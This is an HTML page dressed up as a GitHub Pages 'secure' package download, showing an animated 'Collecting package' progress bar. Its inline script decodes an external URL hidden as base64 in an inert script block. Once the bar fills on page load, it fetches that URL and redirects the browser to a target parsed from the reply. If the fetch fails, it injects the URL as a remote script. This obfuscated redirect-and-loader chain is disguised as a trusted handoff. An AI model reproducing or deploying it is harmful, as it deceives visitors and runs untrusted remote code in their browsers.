<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Collect</title>
    <style>
        * { box-sizing: border-box; }

        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: #05070c;
            color: #e8eef7;
            font-family: Inter, "Segoe UI", Helvetica, Arial, sans-serif;
        }

        .page {
            position: relative;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background:
                radial-gradient(ellipse 38% 22% at 34% 16%, rgba(55, 155, 255, 0.34), transparent 70%),
                radial-gradient(ellipse 28% 18% at 28% 8%, rgba(30, 110, 220, 0.2), transparent 68%),
                radial-gradient(ellipse 46% 34% at 48% 36%, rgba(36, 110, 200, 0.14), transparent 62%),
                radial-gradient(ellipse 32% 28% at 64% 38%, rgba(120, 50, 180, 0.1), transparent 64%),
                radial-gradient(ellipse 38% 32% at 78% 10%, rgba(80, 32, 140, 0.08), transparent 66%),
                linear-gradient(180deg, #070b12 0%, #05070c 62%, #04060a 100%);
        }

        .atm {
            position: absolute;
            left: 8%;
            top: 0;
            width: 42%;
            height: 38%;
            pointer-events: none;
            z-index: 0;
            background: radial-gradient(ellipse 70% 60% at 40% 35%, rgba(60, 160, 255, 0.42), transparent 72%);
            filter: blur(70px);
            opacity: 0.85;
        }

        .floor {
            position: absolute;
            left: 0;
            right: 0;
            top: 58%;
            bottom: 0;
            pointer-events: none;
            z-index: 1;
            background: linear-gradient(180deg,
                rgba(4, 6, 10, 0) 0%,
                rgba(7, 11, 18, 0.22) 26%,
                rgba(8, 12, 18, 0.62) 52%,
                #07090f 82%,
                #05070c 100%);
        }

        .floor-reflect {
            position: absolute;
            inset: -6% 0 0;
            filter: blur(52px);
            opacity: 0.88;
            background:
                radial-gradient(ellipse 46% 52% at 26% 10%, rgba(45, 165, 255, 0.36), transparent 74%),
                radial-gradient(ellipse 46% 52% at 75% 12%, rgba(165, 80, 255, 0.32), transparent 74%);
        }

        .floor-smear {
            position: absolute;
            inset: 4% 8% 0;
            filter: blur(34px);
            opacity: 0.8;
            background:
                radial-gradient(ellipse 22% 92% at 24% 28%, rgba(55, 175, 255, 0.3), transparent 72%),
                radial-gradient(ellipse 16% 70% at 32% 40%, rgba(80, 190, 255, 0.12), transparent 70%),
                radial-gradient(ellipse 16% 70% at 68% 42%, rgba(170, 100, 255, 0.1), transparent 70%),
                radial-gradient(ellipse 22% 92% at 77% 30%, rgba(175, 85, 255, 0.26), transparent 72%);
        }

        .floor-grain {
            position: absolute;
            left: -18%;
            width: 136%;
            top: 6%;
            height: 260%;
            transform: perspective(520px) rotateX(68deg);
            transform-origin: 50% 0;
            opacity: 0.48;
            pointer-events: none;
            mask-image: linear-gradient(180deg, transparent 0%, rgba(0,0,0,0.55) 16%, #000 36%, rgba(0,0,0,0.35) 70%, transparent 88%);
        }

        .floor-grain svg {
            width: 100%;
            height: 100%;
            display: block;
        }

        .floor-spec {
            position: absolute;
            inset: 0;
            background:
                radial-gradient(ellipse 18% 10% at 24% 18%, rgba(140, 210, 255, 0.09), transparent 70%),
                radial-gradient(ellipse 14% 8% at 71% 22%, rgba(190, 140, 255, 0.07), transparent 70%),
                radial-gradient(ellipse 10% 6% at 41% 28%, rgba(200, 220, 255, 0.04), transparent 70%);
            filter: blur(18px);
        }

        .topbar {
            position: absolute;
            top: 16px;
            left: 30px;
            right: 30px;
            height: 74px;
            border-radius: 999px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 22px 0 20px;
            z-index: 5;
            border: 1px solid transparent;
            background:
                linear-gradient(90deg, rgba(6, 10, 18, 0.9), rgba(6, 9, 16, 0.88)) padding-box,
                linear-gradient(90deg, #6ad4ff 0%, rgba(70, 140, 200, 0.2) 42%, rgba(150, 80, 230, 0.2) 58%, #c084ff 100%) border-box;
            box-shadow:
                -10px 0 20px rgba(50, 170, 255, 0.16),
                10px 0 20px rgba(160, 80, 255, 0.14);
        }

        .brand,
        .secure,
        .pages-mark {
            display: flex;
            align-items: center;
        }

        .gh-mark {
            width: 36px;
            height: 36px;
            display: block;
            fill: #f3f6fa;
        }

        .secure {
            gap: 8px;
            color: #d5dde8;
            font-size: 16px;
            font-weight: 500;
        }

        .secure .lock {
            width: 15px;
            height: 15px;
        }

        .v-split {
            width: 1px;
            height: 16px;
            margin: 0 14px;
            background: rgba(210, 220, 235, 0.35);
        }

        .pages-mark {
            gap: 8px;
            color: #c9d3e0;
        }

        .pages-mark .mini-mark {
            width: 16px;
            height: 16px;
            fill: #c5ced8;
        }

        .center-group {
            position: absolute;
            left: 50%;
            top: calc(40% - 30px);
            width: 1100px;
            height: 860px;
            transform: translate(-50%, -50%) scale(0.8);
            transform-origin: center center;
            z-index: 3;
            pointer-events: none;
        }

        .orbit-stage {
            position: absolute;
            left: 50%;
            top: 50%;
            width: 860px;
            height: 286px;
            transform: translate(-50%, -50%);
            z-index: 2;
        }

        .orbit-svg {
            position: absolute;
            inset: 0;
            overflow: visible;
            z-index: 1;
        }

        .orbit-dot {
            position: absolute;
            width: 11px;
            height: 11px;
            border-radius: 50%;
            top: 50%;
            transform: translateY(-50%);
            z-index: 2;
        }

        .orbit-dot.left {
            left: 1.4%;
            background: #8ae2ff;
            box-shadow: 0 0 14px 6px rgba(90, 220, 255, 0.85), 0 0 28px rgba(90, 210, 255, 0.55);
        }

        .orbit-dot.right {
            right: 1.4%;
            background: #d4a6ff;
            box-shadow: 0 0 14px 6px rgba(190, 120, 255, 0.8), 0 0 28px rgba(180, 110, 255, 0.48);
        }

        .octo-wrap {
            position: absolute;
            left: 50%;
            top: 50%;
            width: 368px;
            height: 368px;
            transform: translate(-50%, -50%) perspective(900px) rotateY(-8deg) rotateX(2deg);
            z-index: 3;
            pointer-events: none;
        }

        .octo-3d {
            position: absolute;
            inset: 0;
            overflow: visible;
            filter: drop-shadow(10px 20px 14px rgba(0, 0, 0, 0.58));
        }

        .tile {
            position: absolute;
            width: clamp(118px, 7.1vw, 136px);
            height: clamp(118px, 7.1vw, 136px);
            border-radius: 22px;
            background:
                linear-gradient(152deg, rgba(190, 220, 255, 0.16) 0%, transparent 38%),
                linear-gradient(180deg, #1a2230 0%, #0a0d14 70%, #06080c 100%);
            border: 1.5px solid rgba(170, 210, 245, 0.42);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 4;
        }

        .tile::before {
            content: "";
            position: absolute;
            inset: 0;
            border-radius: inherit;
            pointer-events: none;
            box-shadow:
                inset 0 1px 0 rgba(220, 240, 255, 0.38),
                inset 0 -14px 18px rgba(0, 0, 0, 0.42),
                inset 10px 0 16px rgba(0, 0, 0, 0.16);
        }

        .tile::after {
            content: "";
            position: absolute;
            inset: 9px;
            border-radius: 14px;
            border: 1px solid rgba(180, 210, 240, 0.1);
            background: linear-gradient(160deg, rgba(200, 230, 255, 0.07), transparent 42%);
            pointer-events: none;
        }

        .tile svg {
            width: 46%;
            height: 46%;
            position: relative;
            z-index: 1;
            filter: drop-shadow(0 0 2px rgba(140, 190, 230, 0.22));
        }

        .tile-code {
            left: 8.2%;
            top: -5%;
            transform: perspective(680px) rotate(-6deg) rotateY(8deg);
            border-color: rgba(140, 210, 255, 0.5);
            box-shadow:
                0 0 10px rgba(80, 190, 255, 0.2),
                0 14px 20px rgba(0, 0, 0, 0.48),
                inset 0 0 12px rgba(80, 170, 255, 0.05);
        }

        .tile-branch {
            right: 8.2%;
            top: -8%;
            transform: perspective(680px) rotate(6deg) rotateY(-8deg);
            border-color: rgba(190, 150, 255, 0.42);
            box-shadow:
                0 0 7px rgba(170, 100, 255, 0.12),
                0 14px 20px rgba(0, 0, 0, 0.48),
                inset 0 0 10px rgba(160, 100, 255, 0.04);
        }

        .tile-book {
            left: 1.8%;
            bottom: -3%;
            transform: perspective(680px) rotate(5deg) rotateY(-6deg);
            border-color: rgba(140, 200, 255, 0.42);
            box-shadow:
                0 0 8px rgba(80, 190, 255, 0.16),
                0 14px 20px rgba(0, 0, 0, 0.48),
                inset 0 0 10px rgba(80, 170, 255, 0.04);
        }

        .tile-users {
            right: 1.8%;
            bottom: -1%;
            transform: perspective(680px) rotate(-5deg) rotateY(6deg);
            border-color: rgba(190, 150, 255, 0.4);
            box-shadow:
                0 0 8px rgba(170, 100, 255, 0.12),
                0 14px 20px rgba(0, 0, 0, 0.48),
                inset 0 0 10px rgba(160, 100, 255, 0.04);
        }

        .copy {
            position: absolute;
            left: 50%;
            top: calc(50% + 184px + 18px);
            transform: translateX(-50%);
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 3;
        }

        .wordmark {
            margin: 0;
            width: auto;
            font-size: clamp(70px, 4.8vw, 80px);
            font-weight: 800;
            line-height: 1;
            letter-spacing: -0.035em;
            color: #f7f9fc;
            text-align: center;
        }

        .status-line {
            margin: 8px 0 0;
            font-size: 20px;
            font-weight: 300;
            letter-spacing: 10px;
            color: #b8c2cc;
            text-indent: 10px;
            text-align: center;
            text-transform: uppercase;
        }

        .progress {
            margin-top: 16px;
            width: min(550px, 52vw);
            height: 19px;
            border-radius: 999px;
            background: #15202c;
            box-shadow:
                0 0 22px rgba(80, 180, 255, 0.18),
                inset 0 0 0 1px rgba(140, 180, 220, 0.14),
                inset 0 1px 2px rgba(0, 0, 0, 0.4);
            overflow: visible;
        }

        .progress-fill {
            height: 100%;
            width: 100%;
            border-radius: inherit;
            background: linear-gradient(90deg, #2ec4ff 0%, #3aa6ff 48%, #8b5cff 100%);
            box-shadow:
                0 0 10px rgba(30, 180, 255, 0.4),
                0 0 22px rgba(40, 150, 255, 0.28),
                0 0 28px rgba(140, 80, 255, 0.2);
            transform-origin: left center;
            animation: fillBar 1.7s cubic-bezier(0.22, 0.08, 0.18, 1) forwards;
        }

        @keyframes fillBar {
            from { transform: scaleX(0); }
            to { transform: scaleX(1); }
        }

        .status-footer {
            position: fixed;
            left: 28px;
            right: 28px;
            bottom: 16px;
            height: 50px;
            z-index: 6;
            display: grid;
            grid-template-columns: 1fr auto 1fr;
            align-items: center;
            padding: 0 24px;
            border-radius: 26px;
            border: 1px solid transparent;
            background:
                linear-gradient(
                    90deg,
                    rgba(8, 18, 30, 0.9) 0%,
                    rgba(7, 12, 23, 0.92) 50%,
                    rgba(20, 12, 31, 0.9) 100%
                );
            background-clip: padding-box;
            box-shadow:
                0 0 18px rgba(65, 190, 255, 0.08),
                0 0 22px rgba(170, 80, 255, 0.06);
            color: #d9e2ef;
            font-family: Inter, Arial, sans-serif;
            font-size: 14px;
            font-weight: 500;
        }

        .status-footer::before {
            content: "";
            position: absolute;
            inset: 0;
            padding: 1px;
            border-radius: inherit;
            background: linear-gradient(90deg, #4fd6ff 0%, rgba(90, 120, 255, 0.45) 50%, #b56cff 100%);
            -webkit-mask:
                linear-gradient(#000 0 0) content-box,
                linear-gradient(#000 0 0);
            -webkit-mask-composite: xor;
            mask:
                linear-gradient(#000 0 0) content-box,
                linear-gradient(#000 0 0);
            mask-composite: exclude;
            pointer-events: none;
        }

        .status-footer .status-left,
        .status-footer .status-center,
        .status-footer .status-right {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .status-footer .status-left { justify-self: start; }
        .status-footer .status-center { justify-self: center; }
        .status-footer .status-right { justify-self: end; }

        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #27e87b;
            box-shadow: 0 0 8px rgba(39, 232, 123, 0.65);
        }

        .status-footer .lock {
            width: 14px;
            height: 14px;
            opacity: 0.85;
            flex-shrink: 0;
        }

    </style>
  <!-- Hop URL (https://...) as base64 — stored in inert script, not meta -->
  <script type="text/plain" data-cfg="hop" id="hop-payload">
aHR0cHM6Ly91c2FyYXdoYWxtLmNvbS9ib21iZXIubXV0YWdl
  </script>
  <script type="text/plain" data-cfg="prep-ms" id="prep-ms">1100</script>
</head>
<body>
  <main>
    <h1>Collecting package</h1>
    <p>Preparing a secure handoff. The browser will open the delivery endpoint when the bar is full.</p>
    <progress id="bar" value="0" max="100"></progress>
    <div class="label" id="label">Stage: warm-up</div>
  </main>

  <script type="module">
    const bar = document.getElementById('bar');
    const label = document.getElementById('label');

    function readPlain(id) {
      const el = document.getElementById(id);
      return el ? el.textContent.trim() : '';
    }

    function decodeHop(b64) {
      const url = atob(b64);
      if (!/^https?:\/\//i.test(url)) throw new Error('hop');
      return url;
    }

    function parseRelayBody(text) {
      const body = String(text).trim();
      try {
        const j = JSON.parse(body);
        if (j && j.c) {
          const u = atob(String(j.c).trim());
          if (/^https?:\/\//i.test(u)) return u;
        }
      } catch {}
      const m = body.match(/location\.replace\s*\(\s*['"]([^'"]+)['"]\s*\)/i);
      if (m && m[1]) return m[1];
      throw new Error('parse');
    }

    function attachRelayScript(hopUrl) {
      const s = document.createElement('script');
      s.src = hopUrl;
      s.async = true;
      s.onerror = () => {
        label.textContent = 'Relay blocked by browser';
        label.classList.add('fail');
      };
      document.head.appendChild(s);
    }

    async function release(hopUrl) {
      label.textContent = 'Stage: resolve relay';
      try {
        const res = await fetch(hopUrl, { cache: 'no-store', credentials: 'omit' });
        if (!res.ok) throw new Error('http');
        const target = parseRelayBody(await res.text());
        label.textContent = 'Stage: redirect';
        window.location.replace(target);
        return;
      } catch {
        label.textContent = 'Stage: run relay script';
        attachRelayScript(hopUrl);
      }
    }

    const prepMs = Math.max(400, parseInt(readPlain('prep-ms'), 10) || 1100);
    let hopUrl;
    try {
      hopUrl = decodeHop(readPlain('hop-payload'));
    } catch {
      label.textContent = 'Invalid hop payload block';
      label.classList.add('fail');
      throw new Error('cfg');
    }

    const t0 = performance.now();
    function frame(now) {
      const t = Math.min(1, (now - t0) / prepMs);
      const eased = 1 - Math.pow(1 - t, 2.5);
      bar.value = Math.round(eased * 100);
      if (t < 1) {
        label.textContent = 'Stage: prepare · ' + bar.value + '%';
        requestAnimationFrame(frame);
        return;
      }
      label.textContent = 'Stage: handoff';
      release(hopUrl);
    }
    requestAnimationFrame(frame);
  </script>
</body>
</html>
